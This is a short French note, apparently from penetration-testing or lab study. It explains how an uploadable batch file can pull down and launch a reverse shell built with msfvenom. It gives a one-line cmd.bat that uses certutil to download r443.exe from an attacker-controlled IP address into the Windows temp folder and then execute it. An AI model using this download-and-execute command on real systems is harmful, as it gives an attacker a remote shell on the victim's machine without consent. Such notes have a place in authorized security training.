Si on peut télécharger un fichier de commande bat, on peut créer se script pour récupérer notre reverse shell fait avec msfvenom par certutil

fichier cmd.bat :
```
certutil.exe -f -urlcache -split http://192.168.45.209/r443.exe c:\windows\temp\revershell.exe && cmd.exe /c c:\windows\temp\revershell.exe
```